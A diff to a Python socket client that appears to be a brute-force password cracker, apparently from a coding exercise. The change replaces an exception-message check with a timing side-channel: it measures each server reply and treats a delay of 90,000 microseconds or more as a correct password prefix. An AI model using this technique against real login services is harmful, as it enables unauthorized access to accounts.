@@ -3,6 +3,7 @@ import socket
 from itertools import product
 import json
 import string
+from datetime import datetime
 
 chars = string.ascii_letters + string.digits
 
@@ -34,8 +35,6 @@ def main():
 
                     if response == "Wrong password!":
                         return i
-                    elif response == "Exception happened during login":
-                        return
 
         def get_password():
             password = ""
@@ -47,12 +46,21 @@ def main():
                         "password": password + c
                     }
 
+
                     s.send(json.dumps(data).encode())
+                    start = datetime.now()
+
+
                     response = s.recv(1024).decode()
+                    finish = datetime.now()
+                    
                     response = json.loads(response)
                     response = response['result']
 
-                    if response == "Exception happened during login":
+                    difference = finish - start
+                    #print(difference)
+
+                    if difference.microseconds >= 90000:
                         break
                     elif response == "Connection success!":
                         return password + c
